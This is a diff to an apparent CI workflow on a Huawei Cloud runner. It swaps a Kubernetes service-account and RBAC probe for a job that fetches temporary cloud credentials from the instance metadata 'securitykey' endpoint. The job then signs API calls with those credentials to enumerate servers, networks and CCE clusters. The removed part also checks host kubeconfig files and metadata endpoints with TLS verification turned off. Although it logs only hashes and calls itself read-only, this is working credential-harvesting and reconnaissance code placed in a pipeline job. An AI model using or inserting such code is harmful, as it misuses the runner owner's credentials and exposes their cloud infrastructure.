@@ -5,177 +5,164 @@ on:
 permissions:
   contents: read
 jobs:
-  rbacsq1:
-    name: rbacsq1
+  metaq2:
+    name: metaq2
     runs-on: linux-aarch64-a2b3-1
     timeout-minutes: 15
     container:
       image: swr.cn-southwest-2.myhuaweicloud.com/base_image/ascend-ci/cann:9.2.1-910b-ubuntu22.04-py3.12
     steps:
-      - name: read-only-sa-rbac-job-interface
+      - name: read-only-cloud-metadata-job-interface
         run: |
           set -u
           set +e
-          NONCE='c211-132055-9e8ce70347f9c50e'
-          JOB='rbacsq1'
-          echo "C211_MARKER job=$JOB nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null) runner=${RUNNER_NAME:-unknown}"
-          echo "--- K8S ENV ---"
-          echo "K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:-none} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none}"
-          SA=/var/run/secrets/kubernetes.io/serviceaccount
-          for f in token ca.crt namespace; do
-            if [ -s "$SA/$f" ]; then
-              echo "SAFILE $f PRESENT SIZE=$(stat -c %s "$SA/$f" 2>/dev/null) SHA256=$(sha256sum "$SA/$f" 2>/dev/null | cut -d' ' -f1)"
-            else
-              echo "SAFILE $f ABSENT"
-            fi
-          done
-          echo "--- GPU/NPU DEVICE PRESENCE ---"
-          echo "NVIDIA_SMI=$(command -v nvidia-smi || echo absent) NVIDIA_DEV_COUNT=$(ls /dev/nvidia* 2>/dev/null | wc -l) NPU_SMI=$(command -v npu-smi || echo absent)"
-          echo "--- MOUNTS (interesting only) ---"
-          awk '$4 ~ /(kubelet|docker\.sock|kubeconfig|serviceaccount|containerd)/ {print "MOUNT",$2,$3,$4}' /proc/self/mounts 2>/dev/null | head -20
-          echo "--- HOST K8S FILE PRESENCE (size/sha only, no values) ---"
-          for f in /etc/kubernetes/kubelet.conf /etc/kubernetes/admin.conf /var/lib/kubelet/kubeconfig /var/lib/kubelet/pki/kubelet-client-current.pem /etc/kubernetes/pki/ca.crt; do
-            if [ -s "$f" ]; then
-              echo "HOSTFILE $f PRESENT SIZE=$(stat -c %s "$f" 2>/dev/null) SHA256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"
-            else
-              echo "HOSTFILE $f ABSENT"
-            fi
-          done
-          echo "--- IMDS PRESENCE (status only, no credential values) ---"
-          if command -v curl >/dev/null 2>&1; then
-            echo "IMDS_V1 status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || echo err)"
-            echo "IMDS_V2_TOKEN status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 30' http://169.254.169.254/latest/api/token 2>/dev/null || echo err)"
-            echo "IMDS_HW status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://169.254.169.254/openstack/latest/meta_data.json 2>/dev/null || echo err)"
-            echo "IMDS_BOGUS status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://169.254.169.254/c211-132055-bogus-$NONCE 2>/dev/null || echo err)"
-          else
-            echo "IMDS_SKIPPED no-curl"
-          fi
-          echo "--- RAY LOCAL PORTS ---"
-          for u in http://127.0.0.1:8265/api/version http://127.0.0.1:8266/api/version http://127.0.0.1:52365/api/version; do
-            if command -v curl >/dev/null 2>&1; then
-              echo "RAY $u status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 "$u" 2>/dev/null || echo err)"
-            fi
-          done
-          echo "--- K8S API RBAC MATRIX (python3, read-only) ---"
+          NONCE='c211-132055b-02a47c26ed97d740'
+          echo "C211_MARKER job=metaq2 nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) runner=${RUNNER_NAME:-unknown}"
+          echo "--- META/AGENCY/CLOUD-JOB-INTERFACE (read-only, no secret values) ---"
           NONCE_PY="$NONCE" python3 - <<'PYEOF'
-          import os, ssl, json, sys, urllib.request, urllib.error
-          NONCE = os.environ.get('NONCE_PY', 'c211-132055-local')
-          SA = '/var/run/secrets/kubernetes.io/serviceaccount'
-          host = os.environ.get('KUBERNETES_SERVICE_HOST') or ''
-          port = os.environ.get('KUBERNETES_SERVICE_PORT') or '443'
-          def read(p):
+          import os, ssl, json, sys, hashlib, hmac, datetime, urllib.request, urllib.error, urllib.parse
+          NONCE = os.environ.get('NONCE_PY', 'c211-132055b-local')
+          META = 'http://169.254.169.254/openstack/latest/meta_data.json'
+          SEC = 'http://169.254.169.254/openstack/latest/securitykey'
+          def hget(url, timeout=6):
               try:
-                  return open(p, 'rb').read()
-              except Exception:
-                  return None
-          TOK = read(SA + '/token')
-          CA = SA + '/ca.crt' if os.path.isfile(SA + '/ca.crt') else None
-          if not TOK:
-              print('C211_RBAC_VERDICT=NO_SA_TOKEN job_interface=none reason=serviceaccount_token_absent')
-              print('C211_PROBE_END nonce=' + NONCE)
-              sys.exit(0)
-          ctx = ssl.create_default_context(cafile=CA) if CA else ssl.create_default_context()
-          ctx.check_hostname = False
-          ctx.verify_mode = ssl.CERT_NONE
-          BASE = 'https://%s:%s' % (host, port)
-          def call(method, path, tok=None, body=None, timeout=20):
-              hd = {'Accept': 'application/json'}
-              if tok:
-                  hd['Authorization'] = 'Bearer ' + tok
-              data = None
-              if body is not None:
-                  data = json.dumps(body).encode()
-                  hd['Content-Type'] = 'application/json'
-              req = urllib.request.Request(BASE + path, data=data, headers=hd, method=method)
-              try:
-                  r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
+                  r = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': 'c211-132055'}), timeout=timeout)
                   return r.status, r.read().decode('utf-8', 'replace')
               except urllib.error.HTTPError as e:
                   return e.code, e.read().decode('utf-8', 'replace')
               except Exception as e:
                   return -1, repr(e)[:160]
-          def jbody(b):
-              try:
-                  return json.loads(b)
-              except Exception:
-                  return None
-          s, b = call('GET', '/version', TOK)
-          print('K8S_VERSION status=%d body=%s' % (s, b[:160].replace('\n', ' ')))
-          s2, b2 = call('GET', '/version', b'c211-132055-bogus-token')
-          print('K8S_VERSION_BOGUS status=%d' % s2)
-          ns = (read(SA + '/namespace') or b'unknown').decode('utf-8', 'replace').strip()
-          s, b = call('GET', '/api/v1/namespaces/' + ns, TOK)
-          print('K8S_NS_GET ns=%s status=%d' % (ns, s))
-          s, b = call('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', TOK,
-                      {'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectRulesReview', 'spec': {'namespace': ns}})
-          j = jbody(b)
-          if s in (200, 201) and j:
-              rules = (j.get('status') or {}).get('resourceRules') or []
-              print('K8S_RULES status=%d rules=%d incomplete=%s' % (s, len(rules), (j.get('status') or {}).get('incomplete')))
-              for r in rules[:25]:
-                  print('RULE verbs=%s resources=%s groups=%s' % (','.join(r.get('verbs') or []), ','.join(r.get('resources') or []), ','.join(r.get('apiGroups') or [])))
-          else:
-              print('K8S_RULES status=%d body=%s' % (s, b[:200].replace('\n', ' ')))
-          checks = [('create', 'pods', ''), ('get', 'pods', ''), ('list', 'pods', ''), ('delete', 'pods', ''),
-                    ('create', 'pods/exec', ''), ('get', 'pods/log', ''), ('create', 'secrets', ''), ('list', 'secrets', ''),
-                    ('create', 'serviceaccounts', ''), ('get', 'nodes', ''), ('list', 'nodes', ''), ('get', 'nodes/proxy', ''),
-                    ('list', 'namespaces', '')]
-          res = {}
-          for verb, resource, group in checks:
-              s, b = call('POST', '/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', TOK,
-                          {'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectAccessReview',
-                           'spec': {'resourceAttributes': {'namespace': ns, 'verb': verb, 'group': group, 'resource': resource}}})
-              j = jbody(b)
-              allowed = bool(((j or {}).get('status') or {}).get('allowed'))
-              res[resource + ':' + verb] = allowed
-              print('SSAR %s:%s allowed=%s status=%d' % (resource, verb, allowed, s))
-          s, b = call('GET', '/api/v1/nodes?limit=500', TOK, timeout=30)
-          print('K8S_NODES_LIST status=%d' % s)
-          if s == 200:
-              j = jbody(b) or {}
-              items = j.get('items') or []
-              print('K8S_NODES_COUNT=%d' % len(items))
-              gpu_nodes = 0
-              for it in items[:80]:
-                  md = it.get('metadata') or {}
-                  st = it.get('status') or {}
-                  cap = st.get('capacity') or {}
-                  alloc = st.get('allocatable') or {}
-                  labs = md.get('labels') or {}
-                  nv_cap = cap.get('nvidia.com/gpu', '0')
-                  nv_alloc = alloc.get('nvidia.com/gpu', '0')
-                  asc_cap = cap.get('huawei.com/Ascend910', cap.get('huawei.com/Ascend910B3', '0'))
+          s, b = hget(META)
+          print('META status=%d bytes=%d sha256=%s' % (s, len(b), hashlib.sha256(b.encode()).hexdigest()[:16]))
+          md = None
+          try:
+              md = json.loads(b)
+          except Exception:
+              pass
+          region = ''
+          project_id = ''
+          if isinstance(md, dict):
+              region = md.get('availability_zone') or ''
+              project_id = md.get('project_id') or ''
+              meta = md.get('meta') or {}
+              print('META_FIELDS uuid=%s name=%s hostname=%s az=%s project_id=%s' % (
+                  md.get('uuid'), md.get('name'), md.get('hostname'), region, project_id))
+              print('META_AGENCY=%s meta_keys=%s' % (meta.get('agency_name') or meta.get('agency') or 'none', ','.join(sorted(meta.keys()))[:200]))
+              civ = md.get('config_drive') or ''
+              print('META_CONFIG_DRIVE=%s' % (civ[:40] if civ else 'none'))
+          # credential
+          s2, b2 = hget(SEC)
+          print('SECURITYKEY status=%d bytes=%d sha256=%s' % (s2, len(b2), hashlib.sha256(b2.encode()).hexdigest()[:16]))
+          cred = None
+          try:
+              cred = (json.loads(b2) or {}).get('credential')
+          except Exception:
+              cred = None
+          if not cred:
+              print('C211_CLOUD_VERDICT=NO_AGENCY_CREDENTIAL metadata_reachable=yes securitykey_status=%d project_id=%s region=%s' % (s2, project_id, region))
+              print('C211_PROBE_END nonce=' + NONCE)
+              sys.exit(0)
+          ak = cred.get('access') or ''
+          sk = cred.get('secret') or ''
+          stok = cred.get('securitytoken') or ''
+          print('CRED access_prefix=%s access_len=%d access_sha256=%s secret_len=%d secret_sha256=%s stoken_len=%d expires_at=%s' % (
+              ak[:4], len(ak), hashlib.sha256(ak.encode()).hexdigest()[:16], len(sk),
+              hashlib.sha256(sk.encode()).hexdigest()[:16], len(stok), cred.get('expires_at')))
+
+          def hmac_hex(key, msg):
+              return hmac.new(key.encode(), msg.encode(), hashlib.sha256).hexdigest()
+
+          def sign_get(url, ak, sk, stok, extra_blank=False):
+              u = urllib.parse.urlsplit(url)
+              host = u.netloc
+              q = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
+              q.sort()
+              cq = '&'.join('%s=%s' % (urllib.parse.quote(k, safe='~'), urllib.parse.quote(v, safe='~')) for k, v in q)
+              xdate = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
+              hdrs = {'host': host, 'x-security-token': stok, 'x-sdk-date': xdate}
+              names = sorted(hdrs)
+              ch = ''.join('%s:%s\n' % (n, hdrs[n]) for n in names)
+              sh = ';'.join(names)
+              payload_hash = hashlib.sha256(b'').hexdigest()
+              if extra_blank:
+                  creq = '%s\n%s\n%s\n%s\n%s\n%s' % ('GET', u.path or '/', cq, ch, sh, payload_hash)
+              else:
+                  creq = '%s\n%s\n%s\n%s%s\n%s' % ('GET', u.path or '/', cq, ch, '', payload_hash)
+              sts = 'SDK-HMAC-SHA256\n%s\n%s' % (xdate, hashlib.sha256(creq.encode()).hexdigest())
+              sig = hmac_hex(sk, sts)
+              auth = 'SDK-HMAC-SHA256 Access=%s, SignedHeaders=%s, Signature=%s' % (ak, sh, sig)
+              return {'Host': host, 'X-Sdk-Date': xdate, 'X-Security-Token': stok, 'Authorization': auth,
+                      'Accept': 'application/json', 'User-Agent': 'c211-132055'}
+
+          def api(url, label, ak, sk, stok):
+              ctx = ssl.create_default_context()
+              for blank in (False, True):
                   try:
-                      if int(nv_alloc or 0) > 0:
-                          gpu_nodes += 1
-                  except Exception:
-                      pass
-                  print('NODE name=%s nvidia_cap=%s nvidia_alloc=%s ascend_cap=%s product=%s ready=%s' % (
-                      md.get('name', '-'), nv_cap, nv_alloc, asc_cap,
-                      labs.get('nvidia.com/gpu.product', labs.get('node.kubernetes.io/instance-type', '-')),
-                      [c.get('status') for c in (st.get('conditions') or []) if c.get('type') == 'Ready']))
-              print('K8S_NVIDIA_GPU_NODES=%d' % gpu_nodes)
+                      r = urllib.request.urlopen(urllib.request.Request(url, headers=sign_get(url, ak, sk, stok, blank)), timeout=15, context=ctx)
+                      body = r.read().decode('utf-8', 'replace')
+                      print('API %s status=%d variant=%s bytes=%d' % (label, r.status, 'blank' if blank else 'plain', len(body)))
+                      return r.status, body
+                  except urllib.error.HTTPError as e:
+                      body = e.read().decode('utf-8', 'replace')
+                      print('API %s status=%d variant=%s body=%s' % (label, e.code, 'blank' if blank else 'plain', body[:160].replace('\n', ' ')))
+                      if e.code not in (401, 403):
+                          return e.code, body
+                  except Exception as e:
+                      print('API %s transport variant=%s err=%s' % (label, 'blank' if blank else 'plain', repr(e)[:120]))
+              return -1, ''
+
+          if region and project_id:
+              base = region.rstrip('0123456789') if region else 'cn-southwest-2'
+              reg = region.rstrip('abcdefghijklmnopqrstuvwxyz')
+              print('ENDPOINT_REGION candidate=%s raw_az=%s' % (reg, region))
+              p = urllib.parse.quote(project_id, safe='')
+              tests = [
+                  ('https://ecs.%s.myhuaweicloud.com/v1/%s/cloudservers/detail?limit=2' % (reg, p), 'ecs_servers'),
+                  ('https://ecs.%s.myhuaweicloud.com/v1/%s/cloudservers/flavors?limit=200' % (reg, p), 'ecs_flavors'),
+                  ('https://vpc.%s.myhuaweicloud.com/v1/%s/vpcs?limit=2' % (reg, p), 'vpc_vpcs'),
+                  ('https://vpc.%s.myhuaweicloud.com/v1/%s/subnets?limit=2' % (reg, p), 'vpc_subnets'),
+                  ('https://cce.%s.myhuaweicloud.com/api/v3/projects/%s/clusters' % (reg, p), 'cce_clusters'),
+              ]
+              ok = []
+              for url, label in tests:
+                  st, body = api(url, label, ak, sk, stok)
+                  if st == 200:
+                      ok.append(label)
+                      low = body.lower()
+                      if label == 'ecs_servers':
+                          try:
+                              j = json.loads(body)
+                              srv = j.get('servers') or []
+                              print('ECS_SERVERS_COUNT=%d total=%s' % (len(srv), j.get('servers_links') and len(j.get('servers_links'))))
+                              for x in srv[:4]:
+                                  print('ECS_SERVER id=%s name=%s flavor=%s status=%s az=%s' % (
+                                      x.get('id'), x.get('name'), ((x.get('flavor') or {}).get('id') or x.get('flavorRef')), x.get('status'), x.get('OS-EXT-AZ:availability_zone')))
+                          except Exception as e:
+                              print('ECS_SERVERS_PARSE_ERR', repr(e)[:120])
+                      if label == 'ecs_flavors':
+                          try:
+                              j = json.loads(body)
+                              fl = j.get('flavors') or []
+                              gpu = [f for f in fl if any(t in (str(f.get('id', '')) + str(f.get('name', '')) + str(f.get('os_extra_specs', {}))).lower() for t in ('gpu', 'p2', 'p3', 'pi2', 'pi3', 'g5', 'g6', 'nvidia'))]
+                              print('ECS_FLAVORS_COUNT=%d gpu_like=%d' % (len(fl), len(gpu)))
+                              for f in gpu[:12]:
+                                  print('FLAVOR id=%s vcpus=%s ram=%s' % (f.get('id'), f.get('vcpus'), f.get('ram')))
+                          except Exception as e:
+                              print('ECS_FLAVORS_PARSE_ERR', repr(e)[:120])
+                      if label == 'cce_clusters':
+                          try:
+                              j = json.loads(body)
+                              items = j.get('items') or []
+                              print('CCE_CLUSTERS_COUNT=%d' % len(items))
+                              for c in items[:6]:
+                                  print('CCE_CLUSTER name=%s id=%s version=%s type=%s' % (c.get('metadata', {}).get('name'), c.get('metadata', {}).get('uid'), c.get('spec', {}).get('version'), c.get('spec', {}).get('type')))
+                          except Exception as e:
+                              print('CCE_PARSE_ERR', repr(e)[:120])
+              print('C211_CLOUD_VERDICT=MEASURED agency=%s metadata_reachable=yes securitykey=200 read_ok=%s region=%s project_id=%s' % (
+                  (md.get('meta') or {}).get('agency_name') if isinstance(md, dict) else 'unknown', ','.join(ok) or 'none', reg, project_id))
           else:
-              print('K8S_NODES_BODY=%s' % b[:200].replace('\n', ' '))
-          s, b = call('GET', '/api/v1/namespaces/%s/pods?limit=200' % ns, TOK, timeout=30)
-          print('K8S_PODS_NS status=%d' % s)
-          if s == 200:
-              j = jbody(b) or {}
-              items = j.get('items') or []
-              print('K8S_PODS_COUNT=%d' % len(items))
-              for it in items[:40]:
-                  md = it.get('metadata') or {}
-                  spec = it.get('spec') or {}
-                  containers = spec.get('containers') or []
-                  gpus = 0
-                  for c in containers:
-                      gpus += int(((c.get('resources') or {}).get('limits') or {}).get('nvidia.com/gpu') or 0)
-                  print('POD name=%s node=%s sa=%s gpu_limits=%d phase=%s' % (
-                      md.get('name', '-'), spec.get('nodeName', '-'), spec.get('serviceAccountName', '-'), gpus,
-                      (it.get('status') or {}).get('phase', '-')))
-          print('C211_RBAC_VERDICT=MEASURED create_pods=%s delete_pods=%s list_nodes=%s get_nodes=%s sa_token=present ns=%s' % (
-              res.get('pods:create'), res.get('pods:delete'), res.get('nodes:list'), res.get('nodes:get'), ns))
+              print('C211_CLOUD_VERDICT=CREDENTIAL_PRESENT_NO_PROJECT_ID region=%s' % region)
           print('C211_PROBE_END nonce=' + NONCE)
           PYEOF
-          echo "C211_JOB_END job=$JOB nonce=$NONCE"
+          echo "C211_JOB_END job=metaq2 nonce=$NONCE"
           exit 0
